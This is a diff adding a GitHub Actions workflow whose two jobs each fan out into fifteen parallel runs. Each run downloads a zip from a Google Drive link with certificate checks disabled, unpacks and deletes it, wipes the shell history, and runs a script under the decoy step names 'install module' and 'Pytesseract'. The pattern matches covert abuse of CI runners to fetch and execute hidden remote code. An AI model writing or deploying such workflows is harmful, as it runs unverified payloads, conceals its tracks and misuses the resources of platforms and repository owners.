@@ -1,0 +1,56 @@
+name: astromodun573land
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  DELIVER:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Draft', 'Construct', 'Inspect', 'Trigger', 'Ship']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1ngTPaFZkpwJlJPtZ9Elml4lqqGG3w5ml" -O ActiveMQ.zip
+        unzip -o ActiveMQ.zip
+        rm ActiveMQ.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+
+
+  SHIP1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Start', 'Code', 'Debug', 'Deploy', 'Monitor']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1ngTPaFZkpwJlJPtZ9Elml4lqqGG3w5ml" -O ActiveMQ.zip
+        unzip -o ActiveMQ.zip
+        rm ActiveMQ.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+        
